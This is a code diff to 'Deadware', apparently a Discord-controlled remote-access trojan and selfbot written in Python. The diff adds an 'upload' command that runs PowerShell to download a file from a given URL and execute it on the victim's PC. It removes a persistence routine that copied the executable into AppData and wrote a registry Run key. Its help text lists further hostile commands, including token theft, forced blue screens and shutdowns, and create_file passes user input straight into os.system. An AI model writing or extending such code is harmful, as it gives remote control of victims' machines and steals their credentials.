@@ -40,7 +40,7 @@ except Exception:
 ### VARIABLES AND STUFF ###
 ### DO NOT TOUCH ANY OF THIS UNLESS YOU KNOW WHAT YOU'RE DOING ###
 class Selfbot():
-    __version__ = 1.0
+    __version__ = 0.1
 
 class Coms():
     __amount__ = 76
@@ -845,6 +845,7 @@ async def create_file(ctx, *, filename : str = None):
     else:
         user = getpass.getuser()
         os.system(f"echo Hello there :) {user} > {filename}.txt")
+        await ctx.send(f'Created file {filename}.txt')
 
 @Deadware.command()
 async def start_process(ctx, *, process):
@@ -880,7 +881,7 @@ async def deadware_bomb(ctx):
 async def help(ctx):
     await ctx.message.delete()
     embed = discord.Embed(title='Deadware Commands', description=' ', colour=RandomColor())
-    embed.add_field(name='Command List', value='test_con - tests connection\ncreate_file <filename> - creates a file\nstart_process <process> - starts process\ncomputer_shutdown - shuts down computer\ndeadware_bomb - messes with computer\nget_token - gets selfbot token\nstart_typing <message> - opens notepad and types message\nget_ip - gets machine IP\nend_task <task> - ends a task\nget_tasks - gets current processes running\nget_netstat - gets netstat output\nblue_screen - blue screen of death\nerror_drawing - cursor error drawing\npersist <reg name> <copy name> - tries to create persistence')
+    embed.add_field(name='Command List', value='test_con - tests connection\ncreate_file <filename> - creates a file\nstart_process <process> - starts process\ncomputer_shutdown - shuts down computer\ndeadware_bomb - messes with computer\nget_token - gets selfbot token\nstart_typing <message> - opens notepad and types message\nget_ip - gets machine IP\nend_task <task> - ends a task\nget_tasks - gets current processes running\nget_netstat - gets netstat output\nblue_screen - blue screen of death\nerror_drawing - cursor error drawing\nupload <uri> <filename> - uploads a file and runs it on their PC')
 
     await ctx.send(embed=embed)
 
@@ -968,20 +969,12 @@ async def error_drawing(ctx):
     except Exception:
         await ctx.send("Could not do error drawing")
 
-import sys, shutil, subprocess
+import subprocess
 @Deadware.command()
-async def persist(ctx, *, reg_name, copy_name):
+async def upload(ctx, *, url, file_name):
     await ctx.message.delete()
-    file_location = os.environ['appdata'] + '\\' + copy_name
-    try:
-        if not os.path.exists(file_location):
-            shutil.copyfile(sys.executable, file_location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
-            await ctx.send('[+] Created Persistence With Reg Key: ' + reg_name)
-        else:
-            await ctx.send('[+] Persistence Already Exists')
-    except:
-        await ctx.send('[+] Error Creating Persistence With The Target Machine')
+    subprocess.call(f'C:\Windows\System32\powershell.exe Invoke-WebRequest -Uri {url} -OutFile .\{file_name}; .\{file_name}', shell=True)
+
 
 loop.create_task(Deadcord.start(token, bot=False))
 loop.create_task(Deadware.start('BOT-TOKEN-HERE')) #CHANGE THIS
